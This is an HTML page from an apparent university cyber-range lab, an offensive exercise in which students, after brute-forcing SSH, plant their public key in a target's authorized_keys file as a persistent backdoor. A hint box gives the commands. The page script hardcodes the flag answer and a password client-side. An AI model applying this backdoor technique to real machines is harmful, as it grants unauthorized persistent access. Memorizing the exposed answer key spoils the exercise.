<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <meta name="description" content="" />
        <meta name="author" content="" />
        <title>Exploitation of SSH (Secure Shell) Protocol - TARUMT Cyber Range</title>
        <link href="https://cdn.jsdelivr.net/npm/simple-datatables@7.1.2/dist/style.min.css" rel="stylesheet" />
        <link href="css/styles.css" rel="stylesheet" />
        <link href="css/questionLayout.css" rel="stylesheet" />
        <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
    </head>
    <body class="sb-nav-fixed">
        <nav class="sb-topnav navbar navbar-expand navbar-dark bg-dark">
            <!-- Navbar Brand-->
            <a class="navbar-brand ps-3" href="index.html">TARUMT Cyber Range</a>
            <!-- Sidebar Toggle-->
            <button class="btn btn-link btn-sm order-1 order-lg-0 me-4 me-lg-0" id="sidebarToggle" href="#!"><i class="fas fa-bars"></i></button>
            <!-- Navbar Search-->
            <form class="d-none d-md-inline-block form-inline ms-auto me-0 me-md-3 my-2 my-md-0">
                <div class="input-group">
                    <input class="form-control" type="text" placeholder="Search for..." aria-label="Search for..." aria-describedby="btnNavbarSearch" />
                    <button class="btn btn-primary" id="btnNavbarSearch" type="button"><i class="fas fa-search"></i></button>
                </div>
            </form>
            <!-- Navbar-->
            <ul class="navbar-nav ms-auto ms-md-0 me-3 me-lg-4">
                <li class="nav-item dropdown">
                    <a class="nav-link dropdown-toggle" id="navbarDropdown" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false"><i class="fas fa-user fa-fw"></i></a>
                    <ul class="dropdown-menu dropdown-menu-end" aria-labelledby="navbarDropdown">
                        <li><a class="dropdown-item" href="#!">Settings</a></li>
                        <li><a class="dropdown-item" href="#!">Activity Log</a></li>
                        <li><hr class="dropdown-divider" /></li>
                        <li><a class="dropdown-item" href="#!">Logout</a></li>
                    </ul>
                </li>
            </ul>
        </nav>
        <div id="layoutSidenav">
            <div id="layoutSidenav_nav">
                <nav class="sb-sidenav accordion sb-sidenav-dark" id="sidenavAccordion">
                    <div class="sb-sidenav-menu">
                        <div class="nav">
                            <div class="sb-sidenav-menu-heading">Core</div>
                            <a class="nav-link" href="index.html">
                                <div class="sb-nav-link-icon"><i class="fas fa-tachometer-alt"></i></div>
                                Dashboard
                            </a>
                            <div class="sb-sidenav-menu-heading">Interface</div>
                            <a class="nav-link collapsed" href="#" data-bs-toggle="collapse" data-bs-target="#collapseStudents" aria-expanded="false" aria-controls="collapseLayouts">
                                <div class="sb-nav-link-icon"><i class="fas fa-columns"></i></div>
                                Student
                                <div class="sb-sidenav-collapse-arrow"><i class="fas fa-angle-down"></i></div>
                            </a>
                            <div class="collapse" id="collapseStudents" aria-labelledby="headingOne" data-bs-parent="#sidenavAccordion">
                                <nav class="sb-sidenav-menu-nested nav">
                                    <a class="nav-link" href="#">Member Of Groups</a>
                                    <a class="nav-link" href="allScenario.html">Scenarios</a>
                                </nav>
                            </div>
                        </div>
                    </div>
                    <div class="sb-sidenav-footer">
                        <div class="small">Logged in as:</div>
                        Andrew Yeo
                    </div>
                </nav>
            </div>
            <div id="layoutSidenav_content">
                <main>
                    <div class="container-fluid px-4">
                        <h1 class="mt-4">Exploitation of SSH (Secure Shell) Protocol</h1>
                        <ol class="breadcrumb mb-4">
                            <li class="breadcrumb-item active">Offensive Exercise </li>
                            <li class="breadcrumb-item active">Difficulty Level: Beginner</li>
                        </ol>
                        <!-- Top nav bar -->
                        <div class="top-nav">
                            <button id="openHintBox" class="open-button">Show Hints</button>
                        </div>
                        <!-- Overlay -->
                        <div id="overlay" class="overlay"></div>

                        <!-- Hint Box -->
                        <div id="hintBox" class="hint-box">
                            <button id="closeHintBox" class="close-button">&times;</button>
                            <div class="hint-content">
                                <p><strong>Set Up the Backdoor with SSH Key Authentication:</strong></p>
                                <p>After gaining access, copy your public key to the target machine to establish persistent access. Since SSH supports various authentication mechanisms, we'll focus on key-based authentication.<br>
                                Generate your SSH key pair on the attacker machine:</p>
                                <pre><code>ssh-keygen -t rsa</code></pre>
                                <p><code>OR</code></p>
                                <pre><code>ssh-keygen -t dsa</code></pre>

                                <p><strong>View your public key:</strong></p>
                                <pre><code>cat ~/.ssh/id_rsa.pub</code></pre>

                                <p>Copy this public key for use on the target machine.</p>
                                <p><strong>Create .ssh Directory on the Target and Paste Your Public Key:</strong></p>
                                <p>On the target machine, create the necessary directories and paste your public key.<br>
                                Command to create the directory:</p>
                                <pre><code>mkdir -p ~/.ssh</code></pre>
                                <p>Paste your public key in the victim’s machine in <code>~/.ssh/authorized_keys</code>:</p>
                                <pre><code>echo "&lt;PasteYourPublicKeyHere&gt;" >> ~/.ssh/authorized_keys</code></pre>
                                <p><code>OR</code></p>
                                <pre><code>scp authorized_keys &lt;ip_address&gt;:/.ssh/authorized_keys</code></pre>

                                <p><strong>SSH Into the Target Without a Password:</strong></p>
                                <p>With your public key in place, you should be able to SSH into the target machine without needing a password from your attacker machine.<br>
                                For example, you can SSH into the target machine by:</p>
                                <pre><code>ssh -i ~/.ssh/id_rsa TargetHostName@TargetHostIP</code></pre>
                                <p><code>OR</code></p>
                                <pre><code>ssh TargetHostName@TargetHostIP</code></pre>
                            </div>
                        </div>

                        <!-- Nav Menu -->
                        <div class="nav-menu">
                            <a href="#" class="back-button"><i class="fas fa-arrow-left"></i></a>
                            <a href="sshAttackAi.php" class="nav-link" data-number="1">1</a>
                            <a href="sshAttackAii.php" class="nav-link" data-number="2">2</a>
                            <a href="sshAttackBi.php" class="nav-link" data-number="2">3</a>
                            <a href="sshAttackBii.php" class="nav-link" data-number="2">4</a>
                            <a href="sshDefendA.php" class="nav-link" data-number="2">5</a>
                            <a href="sshDefendB.php" class="nav-link" data-number="2">6</a>
                            <a href="sshDefendC.php" class="nav-link" data-number="2">7</a>
                            <a href="#" class="next-button"><i class="fas fa-arrow-right"></i></a>
                        </div>

                        <!-- Main Content/ Description of Scenario -->
                        <h2 class="mt-4 question-title" style="padding: 0px 10px;">Exercise A (ii): Creating Backdoor Using SSH key-based authentication<span style="float: right; font-weight: normal; font-size:large;">Suggested Duration: 20 Minutes</span></h2>
                        <div class="main-content">
                            <div class="learning-objectives">
                                <h2>Learning Objectives</h2>
                                <ul>
                                    <li>Learn how to establish persistent access to a compromised system through OpenSSH.</li>
                                    <li>Gain hands-on experience in configuring SSH key-based authentication to create a secure backdoor.</li>
                                    <li>Understand the importance of persistence in real-world cyber attacks and the methods used to maintain access.</li>
                                    <li>Explore the implications of backdoor access on system security and the potential risks associated with SSH vulnerabilities.</li>
                                </ul>
                            </div>

                            <div class="question">
                                <h2>Question</h2>
                                <p>In this continuation exercise, you will build upon your success in conducting a brute force attack on the SSH server. Your task is to establish persistence by <code>configuring remote access</code> through <code>OpenSSH</code>. You need to use the <code>ssh-keygen</code> command to generate an SSH key pair, allowing you to create a backdoor on the target system. Through this hands-on experience, you will gain insights into the techniques used by attackers to ensure ongoing access to their targets.</p>
                            </div>
                        </div>


                        <!-- Submission Flag Area-->
                        <div class="flag-container">
                            <h2 class="flag-title">Submission of flag</h2>
                            <label for="flagInput1">Enter Passcode (Auto generate when configuring remote access success):</label>
                            <input type="text" id="flagInput1" placeholder="Enter passcode" style="width: 100%; padding: 8px;">
                            <button id="submitButton" style="margin-top: 10px; padding: 8px 16px;">Submit</button>
                            <div id="feedback" class="feedback"></div>
                        </div>

                    </div>
                </main>
                <footer class="py-4 bg-light mt-auto">
                    <div class="container-fluid px-4">
                        <div class="d-flex align-items-center justify-content-between small">
                            <div class="text-muted">Copyright &copy; TARUMT Cyber Range 2023</div>
                            <div>
                                <a href="#">Privacy Policy</a>
                                &middot;
                                <a href="#">Terms &amp; Conditions</a>
                            </div>
                        </div>
                    </div>
                </footer>
            </div>
        </div>

        <script>
            document.getElementById('openHintBox').addEventListener('click', function() {
                document.getElementById('hintBox').style.display = 'block';
                document.getElementById('overlay').style.display = 'block';
                document.getElementById('layoutSidenav_nav').style.zIndex = '900'; // Temporarily lower z-index of sidebar
            });

            document.getElementById('closeHintBox').addEventListener('click', function() {
                document.getElementById('hintBox').style.display = 'none';
                document.getElementById('overlay').style.display = 'none';
                document.getElementById('layoutSidenav_nav').style.zIndex = '1000'; // Restore z-index of sidebar
            });

            //Submission of flag
            const correctUsername = "yiyangtan0519"; // Replace this with linking to database in future
            const correctPassword = "abc123"; //Replace this with linking to database in future

            document.getElementById('submitButton').addEventListener('click', function() {
                const userFlag1 = document.getElementById('flagInput1').value;
                const feedback = document.getElementById('feedback');

                if (userFlag1 === correctUsername) {
                    feedback.textContent = "Correct answer!";
                    feedback.className = "feedback correct";
                } else {
                    feedback.textContent = "Flag is incorrect. Please try again.";
                    feedback.className = "feedback incorrect";
                }
            });
        </script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
        <script src="js/scripts.js"></script>
    </body>
</html>
